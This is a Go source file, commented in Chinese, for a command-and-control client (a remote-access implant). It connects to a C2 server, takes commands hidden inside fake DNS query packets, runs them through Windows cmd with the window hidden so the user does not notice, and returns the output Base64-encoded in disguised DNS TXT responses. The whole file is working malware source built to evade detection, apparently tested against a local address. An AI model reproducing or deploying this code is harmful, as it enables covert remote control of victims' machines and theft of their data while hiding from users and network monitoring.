/*
DNS伪装客户端 - 与C2服务器进行伪装通信

通信流程：
1. 建立TCP连接到C2服务器
2. 发送客户端标识符 'A'
3. 接收DNS伪装的命令消息
4. 解析DNS查询，提取实际命令
5. 执行命令并获取结果
6. 将结果封装成DNS响应发送回服务器

DNS伪装特点：
- 所有命令通过DNS查询包接收
- 所有结果通过DNS响应包发送
- 使用Base64编码确保数据安全传输
- 完全模拟正常DNS流量特征
*/

package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

// DNS消息结构定义，与服务器端保持一致
type DNSHeader struct {
	ID      uint16 // 会话标识符
	Flags   uint16 // 标志位
	QDCount uint16 // 查询数量
	ANCount uint16 // 回答数量
	NSCount uint16 // 权威记录数量
	ARCount uint16 // 附加记录数量
}

// DNS查询类型常量
const (
	DNS_TYPE_A     = 1  // A记录
	DNS_TYPE_AAAA  = 28 // AAAA记录
	DNS_TYPE_CNAME = 5  // CNAME记录
	DNS_TYPE_TXT   = 16 // TXT记录 - 用于传输命令和数据
	DNS_CLASS_IN   = 1  // Internet类
)

// DNS标志位定义
const (
	DNS_FLAG_QR = 0x8000 // 查询(0)/响应(1)
	DNS_FLAG_AA = 0x0400 // 权威回答
	DNS_FLAG_RD = 0x0100 // 递归期望
	DNS_FLAG_RA = 0x0080 // 递归可用
)

// DNS伪装相关常量
const (
	DNS_MAX_PAYLOAD    = 512            // DNS UDP最大载荷
	DNS_DOMAIN_SUFFIX  = ".example.com" // 伪装域名后缀
	COMMAND_SUBDOMAIN  = "cmd"          // 命令子域名
	RESPONSE_SUBDOMAIN = "resp"         // 响应子域名
)

func main() {
	// 连接到C2服务器
	conn, err := net.Dial("tcp", "127.0.0.1:8080")
	if err != nil {
		fmt.Println("连接服务器失败:", err)
		return
	}
	defer conn.Close()

	// 发送客户端标识符，告诉服务器这是一个客户端连接
	_, err = conn.Write([]byte{'A'})
	if err != nil {
		fmt.Println("发送客户端标识符失败:", err)
		return
	}

	fmt.Println("已连接到C2服务器，等待DNS伪装命令...")

	for {
		// 从服务器接收DNS伪装的命令
		command, err := readDNSCommand(conn)
		if err != nil {
			fmt.Printf("读取DNS命令失败: %v\n", err)
			// 如果是连接错误，尝试重连
			if isConnectionError(err) {
				fmt.Println("检测到连接断开，程序退出")
				break
			}
			continue
		}

		fmt.Printf("接收到DNS伪装命令: %s\n", command)

		// 执行命令
		result := executeCommand(command)
		fmt.Printf("[调试] 命令执行结果长度: %d 字符\n", len(result))

		// 将结果通过DNS响应发送回服务器
		err = sendDNSResponse(conn, result)
		if err != nil {
			fmt.Printf("发送DNS响应失败: %v\n", err)
			// 如果是连接错误，退出循环
			if isConnectionError(err) {
				fmt.Println("检测到连接断开，程序退出")
				break
			}
		}
	}
}

// readDNSCommand 从服务器读取DNS伪装的命令
func readDNSCommand(conn net.Conn) (string, error) {
	// 设置读取超时
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	defer conn.SetReadDeadline(time.Time{})

	// 读取DNS消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	_, err := conn.Read(lengthBytes)
	if err != nil {
		return "", fmt.Errorf("读取DNS消息长度失败: %w", err)
	}

	messageLength := binary.BigEndian.Uint16(lengthBytes)
	if messageLength == 0 {
		return "", fmt.Errorf("无效的DNS消息长度: %d", messageLength)
	}

	fmt.Printf("[调试] DNS消息长度: %d 字节\n", messageLength)

	// 读取完整的DNS查询消息
	dnsData := make([]byte, messageLength)
	totalRead := 0
	for totalRead < int(messageLength) {
		n, err := conn.Read(dnsData[totalRead:])
		if err != nil {
			return "", fmt.Errorf("读取DNS查询数据失败(已读取%d/%d字节): %w", totalRead, messageLength, err)
		}
		totalRead += n
	}

	fmt.Printf("[调试] 成功读取DNS数据: %d 字节\n", totalRead)

	// 解析DNS查询，提取实际命令
	command, err := parseDNSQuery(dnsData)
	if err != nil {
		return "", fmt.Errorf("解析DNS查询失败: %w", err)
	}

	return command, nil
}

// sendDNSResponse 向服务器发送DNS伪装的响应
func sendDNSResponse(conn net.Conn, result string) error {
	// 创建DNS响应消息
	queryID := generateDNSID()
	dnsResponse := createDNSResponse(queryID, result)

	fmt.Printf("[调试] 创建DNS响应，原始结果长度: %d 字符，DNS包长度: %d 字节\n", len(result), len(dnsResponse))

	// 设置写入超时
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetWriteDeadline(time.Time{})

	// 发送消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(dnsResponse)))

	_, err := conn.Write(lengthBytes)
	if err != nil {
		return fmt.Errorf("发送DNS响应长度失败: %w", err)
	}

	// 发送DNS响应数据，确保完整发送
	totalWritten := 0
	for totalWritten < len(dnsResponse) {
		n, err := conn.Write(dnsResponse[totalWritten:])
		if err != nil {
			return fmt.Errorf("发送DNS响应数据失败(已发送%d/%d字节): %w", totalWritten, len(dnsResponse), err)
		}
		totalWritten += n
		fmt.Printf("[调试] 已发送 %d/%d 字节\n", totalWritten, len(dnsResponse))
	}

	fmt.Printf("[调试] 成功发送完整DNS响应: %d 字节\n", totalWritten)

	// 强制刷新输出缓冲区
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
	}

	return nil
}

// executeCommand 执行命令并返回结果
func executeCommand(commandStr string) string {
	commandStr = strings.TrimSpace(commandStr)
	if commandStr == "" {
		return "空命令"
	}

	// 处理cd命令
	if strings.HasPrefix(commandStr, "cd ") {
		dir := strings.TrimSpace(commandStr[3:])
		err := os.Chdir(dir)
		if err != nil {
			return fmt.Sprintf("切换目录失败: %v", err)
		} else {
			currentDir, _ := os.Getwd()
			return fmt.Sprintf("已切换到目录: %s", currentDir)
		}
	}

	// 执行系统命令
	cmd := exec.Command("cmd", "/C", commandStr)
	// 隐藏窗口，避免被发现
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()

	// 将Windows GBK编码的输出转换为UTF-8
	result := convertGBKToUTF8(output)

	if err != nil {
		return fmt.Sprintf("命令执行出错: %v\n输出:\n%s", err, result)
	} else {
		return result
	}
}

// convertGBKToUTF8 将GBK编码的字节转换为UTF-8字符串
func convertGBKToUTF8(gbkBytes []byte) string {
	// 如果是空数据，直接返回
	if len(gbkBytes) == 0 {
		return ""
	}

	// 尝试GBK到UTF-8转换
	decoder := simplifiedchinese.GBK.NewDecoder()
	utf8Bytes, _, err := transform.Bytes(decoder, gbkBytes)
	if err != nil {
		// 如果转换失败，可能原始数据就是UTF-8或ASCII，直接返回
		fmt.Printf("[调试] GBK转换失败，使用原始数据: %v\n", err)
		return string(gbkBytes)
	}

	result := string(utf8Bytes)
	fmt.Printf("[调试] GBK到UTF-8转换完成 - 输入字节: %d，输出字符: %d\n", len(gbkBytes), len(result))
	return result
}

// ==============================================
// DNS伪装工具函数
// ==============================================

// generateDNSID 生成随机的DNS消息ID
func generateDNSID() uint16 {
	var id [2]byte
	rand.Read(id[:])
	return binary.BigEndian.Uint16(id[:])
}

// encodeDNSHeader 将DNS头部结构体编码为字节数组
func encodeDNSHeader(header *DNSHeader) []byte {
	buf := make([]byte, 12)
	binary.BigEndian.PutUint16(buf[0:2], header.ID)
	binary.BigEndian.PutUint16(buf[2:4], header.Flags)
	binary.BigEndian.PutUint16(buf[4:6], header.QDCount)
	binary.BigEndian.PutUint16(buf[6:8], header.ANCount)
	binary.BigEndian.PutUint16(buf[8:10], header.NSCount)
	binary.BigEndian.PutUint16(buf[10:12], header.ARCount)
	return buf
}

// decodeDNSHeader 从字节数组解码DNS头部结构体
func decodeDNSHeader(data []byte) (*DNSHeader, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("DNS头部数据不足，需要12字节，实际%d字节", len(data))
	}

	header := &DNSHeader{
		ID:      binary.BigEndian.Uint16(data[0:2]),
		Flags:   binary.BigEndian.Uint16(data[2:4]),
		QDCount: binary.BigEndian.Uint16(data[4:6]),
		ANCount: binary.BigEndian.Uint16(data[6:8]),
		NSCount: binary.BigEndian.Uint16(data[8:10]),
		ARCount: binary.BigEndian.Uint16(data[10:12]),
	}
	return header, nil
}

// encodeDomainName 将域名编码为DNS格式
func encodeDomainName(domain string) []byte {
	if domain == "" {
		return []byte{0}
	}

	parts := strings.Split(domain, ".")
	var result []byte

	for _, part := range parts {
		if len(part) > 63 {
			part = part[:63] // DNS标签最大63字符
		}
		result = append(result, byte(len(part)))
		result = append(result, []byte(part)...)
	}
	result = append(result, 0) // 域名结束标记
	return result
}

// decodeDomainName 从DNS格式解码域名
func decodeDomainName(data []byte, offset int) (string, int, error) {
	if offset >= len(data) {
		return "", offset, fmt.Errorf("域名数据偏移超界")
	}

	var parts []string
	originalOffset := offset

	for {
		if offset >= len(data) {
			return "", originalOffset, fmt.Errorf("域名数据不完整")
		}

		length := int(data[offset])
		offset++

		if length == 0 {
			break // 域名结束
		}

		// 检查是否为压缩指针
		if length&0xC0 == 0xC0 {
			if offset >= len(data) {
				return "", originalOffset, fmt.Errorf("压缩指针数据不完整")
			}
			// 这是一个压缩指针，跳过处理
			offset++
			break
		}

		if length > 63 {
			return "", originalOffset, fmt.Errorf("无效的域名标签长度: %d", length)
		}

		if offset+length > len(data) {
			return "", originalOffset, fmt.Errorf("域名标签数据不完整")
		}

		part := string(data[offset : offset+length])
		parts = append(parts, part)
		offset += length
	}

	domain := strings.Join(parts, ".")
	return domain, offset, nil
}

// parseDNSQuery 解析DNS查询消息，提取命令数据
func parseDNSQuery(data []byte) (string, error) {
	// 解析DNS头部
	header, err := decodeDNSHeader(data)
	if err != nil {
		return "", fmt.Errorf("解析DNS头部失败: %w", err)
	}

	if header.QDCount == 0 {
		return "", fmt.Errorf("DNS查询没有问题部分")
	}

	// 解析查询域名
	domain, _, err := decodeDomainName(data, 12)
	if err != nil {
		return "", fmt.Errorf("解析域名失败: %w", err)
	}

	// 从域名中提取命令
	if !strings.Contains(domain, COMMAND_SUBDOMAIN) {
		return "", fmt.Errorf("不是命令查询域名")
	}

	// 提取编码的命令部分
	parts := strings.Split(domain, ".")
	if len(parts) < 2 {
		return "", fmt.Errorf("域名格式不正确")
	}

	encodedCommand := parts[0]
	// 使用标准库Base64解码，确保UTF-8中文字符正确处理
	decodedBytes, err := base64.URLEncoding.DecodeString(encodedCommand)
	if err != nil {
		return "", fmt.Errorf("解码命令失败: %w", err)
	}
	command := string(decodedBytes)
	fmt.Printf("[调试] Base64解码完成 - 输入长度: %d，输出UTF-8字节: %d，字符串: %s\n",
		len(encodedCommand), len(decodedBytes), command)

	return command, nil
}

// createDNSResponse 创建DNS响应消息，用于封装响应数据
// 支持大数据分块传输
func createDNSResponse(queryID uint16, responseData string) []byte {
	// 创建DNS响应头部
	header := &DNSHeader{
		ID:      queryID,
		Flags:   DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA, // 响应标志
		QDCount: 1,                                                     // 原始查询
		ANCount: 1,                                                     // 一个回答
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 重构原始查询部分
	queryDomain := fmt.Sprintf("%s%s", RESPONSE_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
	encodedDomain := encodeDomainName(queryDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	// 添加回答部分
	// 名称压缩指针指向查询部分的域名
	namePointer := []byte{0xc0, 0x0c} // 压缩指针指向偏移12的位置
	dnsPacket = append(dnsPacket, namePointer...)

	// 类型和类别
	dnsPacket = append(dnsPacket, typeAndClass...)

	// TTL (生存时间) - 设置为300秒，模拟正常DNS响应
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 300)
	dnsPacket = append(dnsPacket, ttl...)

	// 处理大数据：使用多个TXT记录分块传输
	// 使用标准库Base64编码，确保UTF-8中文字符正确处理
	encodedResponse := base64.URLEncoding.EncodeToString([]byte(responseData))
	fmt.Printf("[调试] Base64编码 - 输入UTF-8字节: %d，输出长度: %d 字符\n",
		len([]byte(responseData)), len(encodedResponse))

	const maxTxtLength = 250 // 留一些余量，避免达到255限制

	if len(encodedResponse) <= maxTxtLength {
		// 小数据，单个TXT记录
		dataLength := make([]byte, 2)
		binary.BigEndian.PutUint16(dataLength, uint16(len(encodedResponse)+1))
		dnsPacket = append(dnsPacket, dataLength...)

		// TXT记录数据 (长度前缀 + 数据)
		dnsPacket = append(dnsPacket, byte(len(encodedResponse)))
		dnsPacket = append(dnsPacket, []byte(encodedResponse)...)
	} else {
		// 大数据，分块传输
		fmt.Printf("[调试] 数据过大，需要分块传输\n")
		chunks := splitIntoChunks(encodedResponse, maxTxtLength)

		// 计算总数据长度
		totalDataLen := 0
		for _, chunk := range chunks {
			totalDataLen += len(chunk) + 1 // +1 for length prefix
		}

		dataLength := make([]byte, 2)
		binary.BigEndian.PutUint16(dataLength, uint16(totalDataLen))
		dnsPacket = append(dnsPacket, dataLength...)

		// 添加所有分块
		for i, chunk := range chunks {
			fmt.Printf("[调试] 添加分块 %d/%d，长度: %d\n", i+1, len(chunks), len(chunk))
			dnsPacket = append(dnsPacket, byte(len(chunk)))
			dnsPacket = append(dnsPacket, []byte(chunk)...)
		}
	}

	return dnsPacket
}

// isConnectionError 检查是否为连接错误
func isConnectionError(err error) bool {
	if err == nil {
		return false
	}
	errStr := err.Error()
	return strings.Contains(errStr, "connection") ||
		strings.Contains(errStr, "broken pipe") ||
		strings.Contains(errStr, "reset by peer") ||
		strings.Contains(errStr, "aborted") ||
		strings.Contains(errStr, "EOF")
}

// splitIntoChunks 将字符串分割成指定大小的块
func splitIntoChunks(data string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[i:end])
	}
	return chunks
}
